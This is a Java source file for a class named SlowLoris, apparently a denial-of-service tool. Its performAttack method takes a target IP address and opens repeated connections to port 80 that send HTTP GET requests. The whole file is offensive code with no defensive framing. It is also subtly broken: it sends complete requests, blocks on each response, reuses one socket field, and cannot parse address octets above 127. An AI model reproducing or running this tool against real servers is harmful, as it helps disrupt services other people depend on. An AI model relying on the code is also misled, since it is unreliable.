package SlowLoris;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.regex.Pattern;

public class SlowLoris {
    private String ipAddr;
    private byte[] ipBytes;
    private int numConnections;

    public static final int DEFAULT_CONNECTIONS = 10;
    public static final int MAX_CONNECTIONS = 300;

    private Socket sock;
    private BufferedReader in;
    private PrintWriter out;

    public SlowLoris() {
        ipAddr = "";
        setNumConnections(DEFAULT_CONNECTIONS);
    }

    public SlowLoris(int nc) {
        ipAddr = "";
        if(!setNumConnections(nc)) {
            numConnections = 1;
        }
    }

    public SlowLoris(int nc, String ip) {
        if(!setNumConnections(nc)) {
            numConnections = 1;
        }
        if(!setIPAddr(ip)) {
            ipAddr = "";
        }
    }

    public void performAttack() {
        String[] responses = new String[numConnections];
        if(ipBytes != null) {
            for(int i = 0; i < numConnections; i++) {
                try {
                    InetAddress ia = InetAddress.getByAddress(ipBytes);
                    System.out.println("Attempting connection to " + ia.getHostAddress());
                    sock = new Socket(ia, 80);
                    in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                    out = new PrintWriter(sock.getOutputStream(), true);
                } catch(Exception e) {
                    System.out.println(e);
                    e.printStackTrace();
                }
                if(sock == null) {
                    break;
                }
                System.out.println("Successful connection.\n");
                try {
                    out.write("GET / HTTP/1.1\n");
                    out.write("User-Agent: no good\n");
                    out.write("Host: goaway.com\n");
                    out.write("Accept-Language: en\n");
                    out.write("\n");
                    String response = in.readLine();
                    responses[i] = response;
                } catch(Exception e) {
                    responses[i] = e.toString();
                }
            }
        }
    }

    public int getNumConnections() {
        return numConnections;
    }

    public String getIPAddr() {
        return ipAddr;
    }

    public byte[] getIPBytes() {
        return ipBytes != null ? ipBytes : new byte[4];
    }

    public boolean setNumConnections(int nc) {
        if(nc > 0) {
            numConnections = nc;
            return true;
        } else {
            return false;
        }
    }

    public boolean setIPAddr(String ip) {
        if(ip == null || ip.isEmpty()) {
            return false;
        }
        String[] ipSplit = ip.split(Pattern.quote("."));
        for(String s : ipSplit) {
            System.out.println(s);
        }
        if(ipSplit.length == 4) {
            byte[] ipBytesTemp = new byte[4];
            try {
                for(int i = 0; i < 4; i++) {
                    ipBytesTemp[i] = Byte.parseByte(ipSplit[i]);
                }
                ipBytes = ipBytesTemp;
                ipAddr = ip;
                return true;
            } catch(Exception e) {
                e.printStackTrace();
                return false;
            }
        } else {
            return false;
        }
    }
}
